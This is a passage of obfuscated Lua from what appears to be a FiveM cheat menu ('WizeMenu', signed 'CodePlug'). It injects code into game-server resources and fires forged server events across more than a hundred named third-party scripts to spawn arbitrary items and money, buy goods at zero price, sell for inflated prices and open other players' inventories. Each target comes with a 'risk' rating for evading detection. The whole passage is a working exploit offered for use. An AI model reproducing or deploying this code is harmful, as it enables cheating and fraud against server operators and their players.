                                            elseif ActiveInventory == "qb" then
                                                TriggerServerEvent('inventory:server:OpenInventory', 'otherplayer', serverId)
                                            end
                                        end
                                    end
                                end
                            end)
                        end

                        awt72q48dsgn()

                    ]]):format(v380));break;end end else MachoInjectResource2(2 + 1 ,v234.resource,v234.code);end break;end if (v233==(0 -0)) then v234=v67[v66];if  not v234 then return;end v233=1 + 0 ;end end end);ItemNameHandle=MachoMenuInputbox(v46[1],"Name:","...");ItemAmountHandle=MachoMenuInputbox(v46[1],"Amount:","...");local v68={turn=1,akIndex=1};local function v69(v235) MachoInjectResource("any",v235);end MachoMenuButton(v46[1],"Spawn Item",function() if  not v7() then return;end local v236=MachoMenuGetInputbox(ItemNameHandle);local v237=MachoMenuGetInputbox(ItemAmountHandle);if ( not v236 or (v236=="") or  not v237 or  not tonumber(v237)) then local v303=0;while true do if (v303==(512 -(409 + 103))) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Invalid Item or Amount.");return;end end end local v238=tonumber(v237);local v239={{id="ak_item",name="Any Item Trigger (SAFE)",type="item",res={"ak47_whitewidowv2","ak47_cannabiscafev2","ak47_khusland","ak47_khusbites","ak47_leafnlatte","ak47_qb_cannabiscafev2","ak47_qb_leafnlatte","ak47_qb_khusland","ak47_qb_khusbites","ak47_qb_whitewidowv2"},all=false},{id="nails_money",name="Money Trigger (SAFE)",type="money",res={"codewave-nails-phone"},all=true},{id="handbag_money",name="Money Trigger (SAFE)",type="money",res={"codewave-handbag-phone"},all=true},{id="sneaker_money",name="Money Trigger (SAFE)",type="money",res={"codewave-sneaker-phone"},all=true},{id="caps_money",name="Money Trigger (SAFE)",type="money",res={"codewave-caps-client-phone"},all=true},{id="generic_money",name="Any Item Trigger (Medium Risk)",type="item",res={"ak47_qb_drugmanagerv2","ak47_drugmanagerv2"},all=false},{id="hotdog_money",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=true},{id="ak47_inventory",name="Any Item Trigger (SAFE)",type="item",res={"ak47_inventory","ak47_qb_inventory"},all=false},{id="shop_purchase",name="Palm Beach ANY ITEM (SAFE)",type="item_only",res={"PalmBeachMiamiMinimap"},all=true},{id="cl_pizzeria",name="Any Item Trigger (Medium Risk)",type="item",res={"CL-Pizzeria"},all=false},{id="solstice_moonshine",name="Any Item Trigger (Medium Risk)",type="item",res={"SolsticeMoonshineV2"},all=false},{id="tk_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"Tk_smokev2"},all=false},{id="ox_cb_ws_sellshop",name="Any Item Trigger (High Risk)",type="item",res={"__ox_cb_ws_sellshop"},all=false},{id="adminplus_selldrugs",name="Any Event Trigger (High Risk)",type="event",res={"adminplus-selldrugs"},all=false},{id="ak47_drugmanager",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanager"},all=false},{id="ak47_drugmanagerv2",name="Any Item Trigger (SAFE)",type="item",res={"ak47_drugmanagerv2"},all=false},{id="ak47_prospecting_reward",name="Give Scrap Items (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak47_prospecting_sell",name="Money Trigger (SAFE)",type="money",res={"ak47_prospecting"},all=false},{id="ak4y_fishing del",name="Any Item Trigger (Medium Risk)",type="item",res={"ak4y-advancedFishing"},all=false},{id="ak4y_case_opening",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-caseOpening"},all=false},{id="ak4y_playtime_shop",name="Money Trigger (Medium Risk)",type="money",res={"ak4y-playTimeShop"},all=false},{id="angelicxs_civilian_payment",name="Money Trigger (SAFE)",type="money",res={"angelicxs-civilianjobs"},all=false},{id="angelicxs_civilian_item",name="Any Item Trigger (SAFE)",type="item",res={"angelicxs-civilianjobs"},all=false},{id="apex_cluckinbell",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_cluckinbell"},all=false},{id="apex_rexdiner",name="Any Item Trigger (Medium Risk)",type="item",res={"apex_rexdiner"},all=false},{id="ars_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_hunting"},all=false},{id="ars_vvsgrillz",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsgrillz_v2"},all=false},{id="ars_vvsguns",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsguns"},all=false},{id="ars_vvsjewelry",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_vvsjewelry"},all=false},{id="ars_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"ars_whitewidow_v2"},all=false},{id="av_business",name="Any Item Trigger (Medium Risk)",type="item",res={"av_business"},all=false},{id="boii_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-drugs"},all=false},{id="boii_moneylaunderer",name="Money Trigger (Medium Risk)",type="money",res={"boii-moneylaunderer"},all=false},{id="boii_pawnshop",name="Any Item Trigger (Medium Risk)",type="item",res={"boii-pawnshop"},all=false},{id="boii_salvage_diving",name="Any Event Trigger (Medium Risk)",type="event",res={"boii-salavagediving"},all=false},{id="boii_whitewidow",name="Any Item Trigger (Medium Risk)",type="item",res={"boii_whitewidow"},all=false},{id="brutal_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_hunting"},all=false},{id="brutal_shop_robbery",name="Any Item Trigger (Medium Risk)",type="item",res={"brutal_shop_robbery"},all=false},{id="cfx_tcd_starter",name="Any Event Trigger (Medium Risk)",type="event",res={"cfx-tcd-starterpack"},all=false},{id="core_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"core_crafting"},all=false},{id="d3mba_heroin",name="Any Item Trigger (Medium Risk)",type="item",res={"d3MBA-heroin"},all=false},{id="dcweedroll",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedroll"},all=false},{id="dcweedrollnew",name="Any Item Trigger (Medium Risk)",type="item",res={"dcweedrollnew"},all=false},{id="devcore_needs",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_needs"},all=false},{id="devcore_smokev2",name="Any Item Trigger (Medium Risk)",type="item",res={"devcore_smokev2"},all=false},{id="dusa_pets",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa-pets"},all=false},{id="dusa_pet_shop",name="Any Item Trigger (Medium Risk)",type="item",res={"dusa_pet"},all=false},{id="dv_donut_delivery",name="Money Trigger (Medium Risk)",type="money",res={"dv-donutdeliveryjob"},all=false},{id="esx_weashop",name="Any Item Trigger (Medium Risk)",type="item",res={"esx_weashop"},all=false},{id="ez_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"ez_lib"},all=false},{id="fivecode_camping",name="Any Item Trigger (Medium Risk)",type="item",res={"fivecode_camping"},all=false},{id="food_mechanics",name="Any Item Trigger (Medium Risk)",type="item",res={"food_mechanics"},all=false},{id="forge_starter",name="Any Item Trigger (Medium Risk)",type="item",res={"forge-starter"},all=false},{id="fs_placeables",name="Any Item Trigger (Medium Risk)",type="item",res={"fs_placeables"},all=false},{id="fuksus_shops",name="Any Item Trigger (Medium Risk)",type="item",res={"fuksus-shops"},all=false},{id="gardener_job",name="Money Trigger (Medium Risk)",type="money",res={"gardenerjob"},all=false},{id="guatau_consumibles",name="Any Item Trigger (Medium Risk)",type="item",res={"guataubaconsumibles"},all=false},{id="hg_wheel",name="Any Item Trigger (Medium Risk)",type="item",res={"hg-wheel"},all=false},{id="horizon_payment",name="Any Item Trigger (Medium Risk)",type="item",res={"horizon_paymentsystem"},all=false},{id="complete_hunting",name="Any Item Trigger (Medium Risk)",type="item",res={"hunting"},all=false},{id="inside_fruitpicker",name="Money Trigger (Medium Risk)",type="money",res={"inside-fruitpicker"},all=false},{id="inverse_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"inverse-consumables"},all=false},{id="it_lib",name="Any Item Trigger (SAFE)",type="item",res={"it-lib"},all=false},{id="jg_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jg-mechanic"},all=false},{id="jim_bakery",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-bakery"},all=false},{id="jim_beanmachine",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-beanmachine"},all=false},{id="jim_burgershot",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-burgershot"},all=false},{id="jim_catcafe",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-catcafe"},all=false},{id="jim_consumables",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-consumables"},all=false},{id="jim_mechanic",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mechanic"},all=false},{id="jim_mining",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-mining"},all=false},{id="jim_pizzathis",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-pizzathis"},all=false},{id="jim_recycle",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-recycle"},all=false},{id="jim_shops_blackmarket",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="jim_shops_open",name="Any Item Trigger (Medium Risk)",type="item",res={"jim-shops"},all=false},{id="kaves_drugsv2",name="Any Item Trigger (Medium Risk)",type="item",res={"kaves_drugsv2"},all=false},{id="mt_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"mt-restaurants"},all=false},{id="mt_printers",name="Any Item Trigger (Medium Risk)",type="item",res={"mt_printers"},all=false},{id="nx_cayo",name="Any Item Trigger (Medium Risk)",type="item",res={"nx-cayo"},all=false},{id="okok_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"okokCrafting"},all=false},{id="pug_business_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-businesscreator"},all=false},{id="pug_chopping",name="Money Trigger (Medium Risk)",type="money",res={"pug-chopping"},all=false},{id="pug_fishing",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-fishing"},all=false},{id="pug_robbery_creator",name="Any Item Trigger (Medium Risk)",type="item",res={"pug-robberycreator"},all=false},{id="qb_crafting",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-crafting"},all=false},{id="qb_drugs",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-drugs"},all=false},{id="qb_garbage_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-garbagejob"},all=false},{id="qb_hotdog_job",name="Money Trigger (Medium Risk)",type="money",res={"qb-hotdogjob"},all=false},{id="qb_recycle_job",name="Any Item Trigger (Medium Risk)",type="item",res={"qb-recyclejob"},all=false},{id="qb_trash_search",name="Money Trigger (Medium Risk)",type="money",res={"qb-trashsearch"},all=false},{id="qb_warehouse",name="Money Trigger (Medium Risk)",type="money",res={"qb-warehouse"},all=false},{id="rm_camperv",name="Any Item Trigger (Medium Risk)",type="item",res={"rm_camperv"},all=false},{id="ry_rent",name="Money Trigger (Medium Risk)",type="money",res={"ry_rent"},all=false},{id="savana_trucker",name="Money Trigger (Medium Risk)",type="money",res={"savana-truckerjob"},all=false},{id="sayer_jukebox",name="Any Item Trigger (Medium Risk)",type="item",res={"sayer-jukebox"},all=false},{id="sell_usb",name="Any Event Trigger (Medium Risk)",type="event",res={"sell_usb"},all=false},{id="snipe_boombox",name="Any Item Trigger (Medium Risk)",type="item",res={"snipe-boombox"},all=false},{id="solos_cashier",name="Money Trigger (Medium Risk)",type="money",res={"solos-cashier"},all=false},{id="solos_food",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-food"},all=false},{id="solos_hookah",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-hookah"},all=false},{id="solos_jointroll",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-jointroll"},all=false},{id="solos_joints",name="Any Item Trigger (High Risk)",type="item",res={"solos-joints"},all=false},{id="solos_methlab",name="Any Item Trigger (High Risk)",type="item",res={"solos-methlab"},all=false},{id="solos_moneywash",name="Any Item Trigger (High Risk)",type="item",res={"solos-moneywash"},all=false},{id="solos_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-restaurants"},all=false},{id="t1ger_gangsystem",name="Any Item Trigger (High Risk)",type="item",res={"t1ger_gangsystem"},all=false},{id="t1ger_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"t1ger_lib"},all=false},{id="xmmx_letscookplus",name="Any Item Trigger (Medium Risk)",type="item",res={"xmmx_letscookplus"},all=false},{id="zat_farming",name="Any Item Trigger (Medium Risk)",type="item",res={"zat-farming"},all=false},{id="zat_weed",name="Any Item Trigger (High Risk)",type="item",res={"zat-weed"},all=false}};local v240=false;for v264,v265 in ipairs(v239) do local v266=false;if v265.all then local v338=1189 -(442 + 747) ;while true do if (v338==0) then v266=true;for v407,v408 in ipairs(v265.res) do if  not v48(v408) then v266=false;break;end end break;end end else for v371,v372 in ipairs(v265.res) do if v48(v372) then v266=true;break;end end end if v266 then local v339=v236;local v340=v238;if ((v265.type=="money") or (v265.type=="event")) then v339="money";end if (v265.id=="ak_item") then for v393=v68.akIndex,( #v265.res + v68.akIndex) -(1136 -(832 + 303))  do local v394=((v393-(947 -(88 + 858)))% #v265.res) + 1 ;local v395=v265.res[v394];if v48(v395) then v68.akIndex=(v394% #v265.res) + 1 ;local v419,v420,v421=table.unpack(GetEntityCoords(PlayerPedId()));local v422=([[Citizen.CreateThread(function() pcall(function() TriggerServerEvent(%q,%q,{['phone']=0},%d,0) end); DoScreenFadeOut(1);Citizen.Wait(1000);SetEntityCoordsNoOffset(PlayerPedId(),%f,%f,%f,false,false,false);Citizen.Wait(1000);DoScreenFadeIn(1000) end)]]):format(v395   .. ":process" ,v339,v340,v419,v420,v421);v69(v422);v240=true;break;end end elseif (v265.id=="nails_money") then local v409=0 + 0 ;while true do if (v409==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardnails",%d) end)'):format(v340));v240=true;break;end end elseif (v265.id=="handbag_money") then local v423=0 + 0 ;while true do if (v423==(789 -(766 + 23))) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardhandbags",%d) end)'):format(v340));v240=true;break;end end elseif (v265.id=="sneaker_money") then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardShoes",%d) end)'):format(v340));v240=true;elseif (v265.id=="caps_money") then local v429=0 -0 ;while true do if ((0 -0)==v429) then v69(('pcall(function() TriggerServerEvent("delivery:giveRewardCaps",%d) end)'):format(v340));v240=true;break;end end elseif (v265.id=="generic_money") then local v430=0 -0 ;while true do if (v430==0) then v69(("pcall(function() TriggerServerEvent('ak47_qb_drugmanagerv2:shop:buy', '53.15-1478.79', {['buyprice']=0, ['currency']='cash', ['name']='%s', ['sellprice']=0, ['label']='Katana MeNu On Top!!'}, %d) end)"):format(v339,v340));v240=true;break;end end elseif (v265.id=="hotdog_money") then local v431=0 -0 ;while true do if (v431==0) then v69(("pcall(function() local ped=GetPlayerPed(-1) local pedCoords=GetEntityCoords(ped) local HotdogsForSale=1 local SellingPrice=%d TriggerServerEvent('qb-hotdogjob:server:Sell', pedCoords, HotdogsForSale, SellingPrice) end)"):format(v340));v240=true;break;end end elseif (v265.id=="ak47_inventory") then local v432=1073 -(1036 + 37) ;while true do if (v432==(0 + 0)) then v69(([[TriggerServerEvent('ak47_inventory:buyItemDrag',{fromInv={identifier=nil,slot=1,slotData={amount=%d,close=true,count=999999999999999,description="CodePlug Found Ts Lol",info={account="cash",buyPrice=0},label="CodePlug Too Good Lol",name="%s",quality=100,slot=1,type="item",weight=0}},toInv={identifier=nil,slot=1,slotData={slot=1}}} )]]):format(v340,v339));v240=true;break;end end elseif (v265.id=="shop_purchase") then local v433=0;local v434;while true do if (v433==(0 -0)) then v434="codeplug"   .. math.random(787 + 213 ,101479 -(641 + 839) ) ;v69(('pcall(function() TriggerServerEvent("shop:purchaseItem2", "%s", "%s", 0) end)'):format(v434,v339));v433=914 -(910 + 3) ;end if (v433==(2 -1)) then v240=true;break;end end elseif (v265.id=="cl_pizzeria") then v69(('pcall(function() TriggerServerEvent("CL-Pizzeria:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="solstice_moonshine") then local v435=0;while true do if ((1684 -(1466 + 218))==v435) then v69(('pcall(function() TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="tk_smokev2") then local v436=0 + 0 ;while true do if (v436==(1148 -(556 + 592))) then v69(('pcall(function() TriggerServerEvent("Tk_smokev2:server:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="ox_cb_ws_sellshop") then v69(('pcall(function() TriggerServerEvent("__ox_cb_ws_sellshop:sellItem", "sellshop", "ws_sellshop:sellItem:17692", { currency = "money", item = "%s", price = 9999999999, quantity = %d }) end)'):format(v339,v340));v240=true;elseif (v265.id=="adminplus_selldrugs") then local v437=0 + 0 ;while true do if (v437==(808 -(329 + 479))) then v69(('pcall(function() TriggerEvent("stasiek_selldrugsv2:findClient",{ ["i"] = 8, ["label"] = "CodePlugFuckedUrCity", ["type"] = "CodePlugFuckedUrCity", ["zone"] = "The Meat Quarter", ["price"] = %d, ["count"] = 0 }) end)'):format(v340));v240=true;break;end end elseif (v265.id=="ak47_drugmanager") then local v438=854 -(174 + 680) ;while true do if ((0 -0)==v438) then v69(('pcall(function() TriggerServerEvent("ak47_drugmanager:pickedupitem","%s","%s",%d) end)'):format(v339,v339,v340));v240=true;break;end end elseif (v265.id=="ak47_drugmanagerv2") then v69(('pcall(function() TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "-1146.444941.22", { buyprice = 0, currency = "money", label = "codeplug", name = "%s", sellprice = 69696969 }, %d ) end)'):format(v339,v340));v240=true;elseif (v265.id=="ak47_prospecting_reward") then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:reward", %d) end)'):format(v340));v240=true;elseif (v265.id=="ak47_prospecting_sell") then local v439=0 -0 ;while true do if (v439==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("ak47_prospecting:sell","cash",%d,9999999999) end)'):format(v340));v240=true;break;end end elseif (v265.id=="ak4y_fishing") then v69(('pcall(function() TriggerServerEvent("ak4y-advancedFishing:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="ak4y_case_opening") then v69(('pcall(function() TriggerServerEvent("ak4y-caseOpening:addGoldCoin", %d) end)'):format(v340));v240=true;elseif (v265.id=="ak4y_playtime_shop") then v69(('pcall(function() TriggerServerEvent("ak4y-playTimeShop:addCoin", %d) end)'):format(v340));v240=true;elseif (v265.id=="angelicxs_civilian_payment") then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:Payment", %d) end)'):format(v340));v240=true;elseif (v265.id=="angelicxs_civilian_item") then local v440=739 -(396 + 343) ;while true do if (v440==0) then v69(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="apex_cluckinbell") then v69(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="apex_rexdiner") then local v441=0 + 0 ;while true do if (v441==0) then v69(('pcall(function() TriggerServerEvent("apex_rexdiner:client:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="ars_hunting") then v69(('pcall(function() TriggerServerEvent("ars_hunting:sellBuyItem", { item = "%s", price = 1, quantity = %d, buy = true }) end)'):format(v339,v340));v240=true;elseif (v265.id=="ars_vvsgrillz") then v69(('pcall(function() TriggerServerEvent("ars_vvsgrillz_v2:Buyitem", "grillz", { items = {{ id = "%s", quantity = %d, price = 0, stock = 999999, totalPrice = 0 }}, method = "bank", total = 0 }, "bank") end)'):format(v339,v340));v240=true;elseif (v265.id=="ars_vvsguns") then v69(('pcall(function() TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = "%s", image = "codeplug", name = "codeplug", page = 2, price = 0, quantity = %d, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v339,v340));v240=true;elseif (v265.id=="ars_vvsjewelry") then v69(('pcall(function() TriggerServerEvent("ars_vvsjewelry:Buyitem", "vvsjewelry", { items = { { id = "%s", image = "CodePlug", name = "CodePlugRunsUrCity", page = 2, price = 0, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v339,v340));v240=true;elseif (v265.id=="ars_whitewidow") then local v442=1477 -(29 + 1448) ;while true do if (v442==(1389 -(135 + 1254))) then v69(('pcall(function() TriggerServerEvent("ars_whitewidow_v2:Buyitem", { items = { { id = "%s", image = "CodeFinder", name = "CodeFinder", page = 1, price = 500, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash") end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="av_business") then v69(('pcall(function() TriggerServerEvent("av_business:addItem", "%s", %d, 9999) end)'):format(v339,v340));v240=true;elseif (v265.id=="boii_drugs") then v69(('pcall(function() TriggerServerEvent("boii-drugs:sv:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="boii_moneylaunderer") then local v443=0 -0 ;while true do if (v443==0) then v69(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:PayPlayer", %d) end)'):format(v340));v240=true;break;end end elseif (v265.id=="boii_pawnshop") then local v444=0 -0 ;while true do if (v444==0) then v69(('pcall(function() TriggerServerEvent("boii-pawnshop:sv:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="boii_salvage_diving") then v69('pcall(function() TriggerServerEvent("boii-salavagediving:server:JewelleryBag") end)');v240=true;elseif (v265.id=="boii_whitewidow") then v69(('pcall(function() TriggerServerEvent("boii_whitewidow:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="brutal_hunting") then local v445=0 + 0 ;while true do if (v445==0) then v69(('pcall(function() TriggerServerEvent("brutal_hunting:server:giveItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="brutal_shop_robbery") then v69(('pcall(function() TriggerServerEvent("brutal_shop_robbery:server:giveItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="cfx_tcd_starter") then local v446=0;while true do if (v446==(1527 -(389 + 1138))) then v69('pcall(function() TriggerEvent("cfx-tcd-starterpack:client:openStarterPack") end)');v240=true;break;end end elseif (v265.id=="core_crafting") then v69(('pcall(function() TriggerServerEvent("core_crafting:giveItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="d3mba_heroin") then local v447=574 -(102 + 472) ;while true do if (v447==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("d3MBA-heroin:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="dcweedroll") then local v448=0 + 0 ;while true do if (v448==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("dcweedroll:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="dcweedrollnew") then local v449=1545 -(320 + 1225) ;while true do if (v449==(0 -0)) then v69(('pcall(function() TriggerServerEvent("dcweedrollnew:server:itemadd", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="devcore_needs") then v69(('pcall(function() TriggerServerEvent("devcore_needs:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="devcore_smokev2") then v69(('pcall(function() TriggerServerEvent("devcore_smokev2:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="dusa_pets") then local v450=0 + 0 ;while true do if (v450==(1464 -(157 + 1307))) then v69(('pcall(function() TriggerServerEvent("dusa-pets:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="dusa_pet_shop") then v69(('pcall(function() TriggerServerEvent("dusa_pet:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="dv_donut_delivery") then v69(('pcall(function() TriggerServerEvent("dv-donutdeliveryjob:server:giveReward", %d) end)'):format(v340));v240=true;elseif (v265.id=="esx_weashop") then local v451=0;while true do if (v451==(1859 -(821 + 1038))) then v69(('pcall(function() TriggerServerEvent("esx_weashop:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="ez_lib") then v69(('pcall(function() TriggerServerEvent("ez_lib:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="fivecode_camping") then v69(('pcall(function() TriggerServerEvent("fivecode_camping:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="food_mechanics") then local v452=0 -0 ;while true do if (v452==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("food_mechanics:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="forge_starter") then local v453=0 -0 ;while true do if (v453==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("forge-starter:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="fs_placeables") then v69(('pcall(function() TriggerServerEvent("fs_placeables:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="fuksus_shops") then v69(('pcall(function() TriggerServerEvent("fuksus-shops:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="gardener_job") then local v454=0;while true do if (v454==0) then v69(('pcall(function() TriggerServerEvent("gardenerjob:server:giveReward", %d) end)'):format(v340));v240=true;break;end end elseif (v265.id=="guatau_consumibles") then local v455=0 -0 ;while true do if ((1026 -(834 + 192))==v455) then v69(('pcall(function() TriggerServerEvent("guataubaconsumibles:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="hg_wheel") then local v456=0 + 0 ;while true do if (v456==(0 + 0)) then v69(('pcall(function() TriggerServerEvent("hg-wheel:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="horizon_payment") then local v457=0;while true do if (v457==0) then v69(('pcall(function() TriggerServerEvent("horizon_paymentsystem:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="complete_hunting") then local v458=0 + 0 ;while true do if (0==v458) then v69(('pcall(function() TriggerServerEvent("hunting:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="inside_fruitpicker") then v69(('pcall(function() TriggerServerEvent("inside-fruitpicker:server:giveReward", %d) end)'):format(v340));v240=true;elseif (v265.id=="inverse_consumables") then local v459=0 -0 ;while true do if (v459==0) then v69(('pcall(function() TriggerServerEvent("inverse-consumables:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="it_lib") then v69(('pcall(function() TriggerServerEvent("it_lib:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jg_mechanic") then v69(('pcall(function() TriggerServerEvent("jg-mechanic:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jim_bakery") then local v460=0;while true do if ((304 -(300 + 4))==v460) then v69(('pcall(function() TriggerServerEvent("jim-bakery:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_beanmachine") then local v461=0;while true do if (v461==0) then v69(('pcall(function() TriggerServerEvent("jim-beanmachine:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_burgershot") then v69(('pcall(function() TriggerServerEvent("jim-burgershot:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jim_catcafe") then v69(('pcall(function() TriggerServerEvent("jim-catcafe:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jim_consumables") then local v462=0;while true do if (v462==0) then v69(('pcall(function() TriggerServerEvent("jim-consumables:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_mechanic") then local v463=0 + 0 ;while true do if (v463==0) then v69(('pcall(function() TriggerServerEvent("jim-mechanic:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_mining") then v69(('pcall(function() TriggerServerEvent("jim-mining:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jim_pizzathis") then local v464=0;while true do if (v464==(0 -0)) then v69(('pcall(function() TriggerServerEvent("jim-pizzathis:server:addItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_recycle") then v69(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="jim_shops_blackmarket") then local v465=0;while true do if (v465==0) then v69(('pcall(function() Config.Goodies = { label = "Blackmarket", slots = 1, items = { [1] = { name = "%s", price = 0, amount = %d, info = {}, type = "item", slot = 1 } } } end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="jim_shops_open") then v69('pcall(function() TriggerServerEvent("jim-shops:ShopOpen", "shop", "illegalshit", Config.Goodies) end)');v240=true;elseif (v265.id=="kaves_drugsv2") then local v466=0;while true do if (v466==(362 -(112 + 250))) then v69(('pcall(function() TriggerServerEvent("kaves_drugsv2:server:giveItem", "%s", %d) end)'):format(v339,v340));v240=true;break;end end elseif (v265.id=="mt_restaurants") then v69(('pcall(function() TriggerServerEvent("mt-restaurants:server:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="mt_printers") then v69(('pcall(function() TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", "mt_printers", "mt_printers:server:itemActions:codeplug", "%s", "add") end)'):format(v339));v240=true;elseif (v265.id=="nx_cayo") then v69(('pcall(function() TriggerServerEvent("nx-cayo:server:AddItem", "%s", %d) end)'):format(v339,v340));v240=true;elseif (v265.id=="okok_crafting") then local v467=0 + 0 ;while true do if (v467==0) then v69(('pcall(function() TriggerServerEvent("okokCrafting:claimAll", "paletogeneral", { ["paletogeneral"] = { [1] = { ["item"] = "%s", ["randomID"] = 431916296, ["recipe"] = { [1] = 